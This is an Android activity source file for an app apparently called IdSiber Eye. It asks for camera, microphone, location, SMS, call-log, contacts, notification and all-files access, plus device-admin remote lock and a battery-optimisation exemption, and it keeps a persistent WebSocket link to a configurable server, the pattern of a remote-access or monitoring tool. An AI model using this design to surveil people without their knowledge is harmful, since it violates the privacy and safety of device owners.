package com.idsiber.eye;

import android.app.AlertDialog;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import android.net.Uri;
import android.os.PowerManager;

public class MainActivity extends Activity {
    
    private static final int REQUEST_ENABLE_ADMIN = 1;
    private static final int REQUEST_IGNORE_BATTERY_OPTIMIZATIONS = 2;
    private static final int REQUEST_ALL_PERMISSIONS = 3;
    private static final int REQUEST_NOTIFICATION_LISTENER = 4;
    private static final int REQUEST_MANAGE_EXTERNAL_STORAGE = 5;
    
    private WebSocketClient wsClient;
    private TextView statusText;
    private TextView deviceIdText;
    private TextView serverText;
    private TextView versionText;
    private Button connectBtn;
    private Button adminBtn;
    private Button notificationBtn;
    private Button serverConfigBtn;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminReceiver;
    private ServerConfig serverConfig;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Initialize server config
        serverConfig = new ServerConfig(this);
        
        initViews();
        initDeviceAdmin();
        initWebSocketClient();
        checkBatteryOptimization();
        requestAllPermissions();
        checkNotificationListenerPermission();
        
        updateUI();
    }
    
    private void initViews() {
        statusText = findViewById(R.id.status_text);
        deviceIdText = findViewById(R.id.device_id_text);
        serverText = findViewById(R.id.server_text);
        versionText = findViewById(R.id.version_text);
        connectBtn = findViewById(R.id.connect_btn);
        adminBtn = findViewById(R.id.admin_btn);
        notificationBtn = findViewById(R.id.notification_btn);
        serverConfigBtn = findViewById(R.id.server_config_btn);
        
        // Set device ID
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        deviceIdText.setText("Device ID: " + deviceId);
        
        // Set server and version info
        updateServerText();
        versionText.setText("Version " + Constants.APP_VERSION + " - IdSiber Indonesia");
        
        connectBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                toggleConnection();
            }
        });
        
        adminBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestDeviceAdmin();
            }
        });
        
        notificationBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestNotificationListenerPermission();
            }
        });
        
        serverConfigBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showServerConfigDialog();
            }
        });
    }
    
    /**
     * Update server text display
     */
    private void updateServerText() {
        String serverUrl = serverConfig.getServerUrl();
        serverText.setText("Server: " + serverUrl);
    }
    
    /**
     * Show dialog to configure server
     */
    private void showServerConfigDialog() {
        // Create dialog
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        View view = getLayoutInflater().inflate(R.layout.dialog_server_config, null);
        builder.setView(view);
        
        // Get dialog components
        final EditText editIp = view.findViewById(R.id.edit_server_ip);
        final EditText editPort = view.findViewById(R.id.edit_server_port);
        Button saveBtn = view.findViewById(R.id.btn_save_server);
        
        // Set current values
        editIp.setText(serverConfig.getServerIp());
        editPort.setText(String.valueOf(serverConfig.getServerPort()));
        
        // Create dialog
        final AlertDialog dialog = builder.create();
        dialog.show();
        
        // Save button click
        saveBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String ip = editIp.getText().toString().trim();
                String portStr = editPort.getText().toString().trim();
                
                // Validate inputs
                if (ip.isEmpty()) {
                    Toast.makeText(MainActivity.this, "Server IP tidak boleh kosong", Toast.LENGTH_SHORT).show();
                    return;
                }
                
                int port;
                try {
                    port = Integer.parseInt(portStr);
                    if (port <= 0 || port > 65535) {
                        Toast.makeText(MainActivity.this, "Port harus antara 1-65535", Toast.LENGTH_SHORT).show();
                        return;
                    }
                } catch (NumberFormatException e) {
                    Toast.makeText(MainActivity.this, "Port tidak valid", Toast.LENGTH_SHORT).show();
                    return;
                }
                
                // Save config
                serverConfig.saveServerConfig(ip, port);
                updateServerText();
                
                // Close dialog
                dialog.dismiss();
                
                // Reconnect if already connected
                if (wsClient != null && wsClient.isConnected()) {
                    Toast.makeText(MainActivity.this, "Server diubah, reconnecting...", Toast.LENGTH_SHORT).show();
                    wsClient.disconnect();
                    initWebSocketClient();
                    wsClient.connect();
                } else {
                    Toast.makeText(MainActivity.this, "Server configuration saved", Toast.LENGTH_SHORT).show();
                    initWebSocketClient();
                }
            }
        });
    }
    
    private void initDeviceAdmin() {
        devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        adminReceiver = new ComponentName(this, IdSiberDeviceAdminReceiver.class);
    }
    
    private void initWebSocketClient() {
        wsClient = new WebSocketClient(this, new WebSocketClient.StatusCallback() {
            @Override
            public void onStatusChange(final String status) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        statusText.setText(status);
                        updateUI();
                    }
                });
            }
            
            @Override
            public void onError(final String error) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(MainActivity.this, "Error: " + error, Toast.LENGTH_SHORT).show();
                    }
                });
            }
        });
    }
    
    private void toggleConnection() {
        if (wsClient.isConnected()) {
            wsClient.disconnect();
            stopWebSocketService();
        } else {
            wsClient.connect();
            startWebSocketService();
        }
    }
    
    private void startWebSocketService() {
        Intent serviceIntent = new Intent(this, WebSocketService.class);
        startForegroundService(serviceIntent);
    }
    
    private void stopWebSocketService() {
        Intent serviceIntent = new Intent(this, WebSocketService.class);
        stopService(serviceIntent);
    }
    
    private void requestDeviceAdmin() {
        if (!devicePolicyManager.isAdminActive(adminReceiver)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminReceiver);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                "This app needs device admin permission to lock the screen remotely.");
            startActivityForResult(intent, REQUEST_ENABLE_ADMIN);
        } else {
            Toast.makeText(this, "Device admin already enabled", Toast.LENGTH_SHORT).show();
        }
    }
    
    private void checkBatteryOptimization() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        }
    }

    private void requestAllPermissions() {
        // List semua permission berbahaya yang diperlukan
        java.util.ArrayList<String> requiredPermissions = new java.util.ArrayList<>();
        
        // Basic permissions
        requiredPermissions.add(android.Manifest.permission.CAMERA);
        requiredPermissions.add(android.Manifest.permission.RECORD_AUDIO);
        requiredPermissions.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
        requiredPermissions.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
        requiredPermissions.add(android.Manifest.permission.READ_CONTACTS);
        requiredPermissions.add(android.Manifest.permission.READ_CALL_LOG);
        requiredPermissions.add(android.Manifest.permission.READ_SMS);
        requiredPermissions.add(android.Manifest.permission.READ_PHONE_STATE);
        
        // Storage permissions based on Android version
        if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.Q) {
            // Android 10 and below - use traditional storage permissions
            requiredPermissions.add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE);
            requiredPermissions.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        // For Android 11+, we'll handle MANAGE_EXTERNAL_STORAGE separately
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            // Check if we already have MANAGE_EXTERNAL_STORAGE permission
            if (!Environment.isExternalStorageManager()) {
                // Request MANAGE_EXTERNAL_STORAGE permission via intent
                requestManageExternalStoragePermission();
            }
        }
        
        String[] permissionsArray = requiredPermissions.toArray(new String[0]);

        // Cek permission yang belum diberikan
        java.util.ArrayList<String> permissionsToRequest = new java.util.ArrayList<>();
        for (String permission : requiredPermissions) {
            if (checkSelfPermission(permission) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        // Request permission yang belum diberikan
        if (!permissionsToRequest.isEmpty()) {
            requestPermissions(permissionsToRequest.toArray(new String[0]), REQUEST_ALL_PERMISSIONS);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == REQUEST_ALL_PERMISSIONS) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                Toast.makeText(this, "All permissions granted!", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Some permissions were denied. Some features may not work.", Toast.LENGTH_LONG).show();
            }
        }
    }
    
    /**
     * Request notification listener permission
     */
    private void requestNotificationListenerPermission() {
        Intent intent = new Intent();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            intent.setAction(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
        } else {
            intent.setAction("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
        }
        startActivityForResult(intent, REQUEST_NOTIFICATION_LISTENER);
    }

    /**
     * Request MANAGE_EXTERNAL_STORAGE permission for Android 11+
     */
    private void requestManageExternalStoragePermission() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_MANAGE_EXTERNAL_STORAGE);
            } catch (Exception e) {
                // Fallback for some devices
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivityForResult(intent, REQUEST_MANAGE_EXTERNAL_STORAGE);
            }
        }
    }
    
    /**
     * Check if notification listener permission is granted
     */
    private boolean isNotificationListenerEnabled() {
        String packageName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(),
                "enabled_notification_listeners");
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final ComponentName componentName = ComponentName.unflattenFromString(name);
                if (componentName != null && TextUtils.equals(packageName, componentName.getPackageName())) {
                    return true;
                }
            }
        }
        return false;
    }
    
    /**
     * Check notification listener permission and update UI
     */
    private void checkNotificationListenerPermission() {
        boolean isEnabled = isNotificationListenerEnabled();
        if (notificationBtn != null) {
            notificationBtn.setText(isEnabled ? "Notification Access Enabled ✓" : "Enable Notification Access");
            notificationBtn.setEnabled(!isEnabled);
        }
        
        // If enabled, make sure the service is running
        if (isEnabled) {
            toggleNotificationListenerService();
        }
    }
    
    /**
     * Toggle the notification listener service
     */
    private void toggleNotificationListenerService() {
        ComponentName componentName = new ComponentName(this, IdSiberNotificationListener.class);
        PackageManager pm = getPackageManager();
        
        pm.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        
        pm.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }
    
    private void updateUI() {
        boolean isConnected = wsClient.isConnected();
        boolean isAdmin = devicePolicyManager.isAdminActive(adminReceiver);
        boolean hasNotificationAccess = isNotificationListenerEnabled();
        
        connectBtn.setText(isConnected ? "Disconnect" : "Connect");
        connectBtn.setEnabled(true);
        
        adminBtn.setText(isAdmin ? "Admin Enabled ✓" : "Enable Device Admin");
        adminBtn.setEnabled(!isAdmin);
        
        notificationBtn.setText(hasNotificationAccess ? "Notification Access Enabled ✓" : "Enable Notification Access");
        notificationBtn.setEnabled(!hasNotificationAccess);
        
        if (isConnected && isAdmin && hasNotificationAccess) {
            statusText.setTextColor(getColor(android.R.color.holo_green_dark));
            statusText.setText("All Services Running ✓");
        } else if (isConnected) {
            statusText.setTextColor(getColor(android.R.color.holo_orange_dark));
        } else {
            statusText.setTextColor(getColor(android.R.color.holo_red_dark));
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        switch (requestCode) {
            case REQUEST_ENABLE_ADMIN:
                if (resultCode == RESULT_OK) {
                    Toast.makeText(this, "Device admin enabled successfully!", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "Device admin permission denied", Toast.LENGTH_SHORT).show();
                }
                updateUI();
                break;
                
            case REQUEST_IGNORE_BATTERY_OPTIMIZATIONS:
                if (resultCode == RESULT_OK) {
                    Toast.makeText(this, "Battery optimization disabled", Toast.LENGTH_SHORT).show();
                }
                break;
                
            case REQUEST_NOTIFICATION_LISTENER:
                // Check if permission was granted
                checkNotificationListenerPermission();
                updateUI();
                break;
                
            case REQUEST_MANAGE_EXTERNAL_STORAGE:
                // Check if MANAGE_EXTERNAL_STORAGE permission was granted
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                    if (Environment.isExternalStorageManager()) {
                        Toast.makeText(this, "Full storage access granted", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(this, "Full storage access denied", Toast.LENGTH_SHORT).show();
                    }
                }
                break;
        }
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        updateUI();
        // Update server text in case it was changed
        updateServerText();
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (wsClient != null) {
            wsClient.disconnect();
        }
    }
}